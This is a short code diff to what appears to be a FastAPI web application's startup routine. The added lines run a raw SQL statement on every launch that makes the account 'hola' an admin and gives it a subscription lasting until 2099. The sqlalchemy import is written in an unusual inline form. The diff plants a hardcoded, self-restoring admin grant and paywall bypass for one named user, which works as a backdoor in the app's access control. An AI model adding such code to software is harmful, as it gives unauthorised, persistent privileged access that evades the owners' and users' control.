@@ -400,6 +400,14 @@ async def lifespan(app: FastAPI):
                         "WHERE role = 'admin' AND subscription_ends_at IS NULL"
                     )
                 )
+                # Ensure user 'hola' is superadmin with permanent access
+                await conn.execute(
+                    __import__("sqlalchemy").text(
+                        "UPDATE users SET role = 'admin', "
+                        "subscription_ends_at = '2099-12-31T23:59:59+00' "
+                        "WHERE username = 'hola'"
+                    )
+                )
         logger.info("admin_access_ensured")
 
         # 2. Auto-seed assets if the assets table is empty
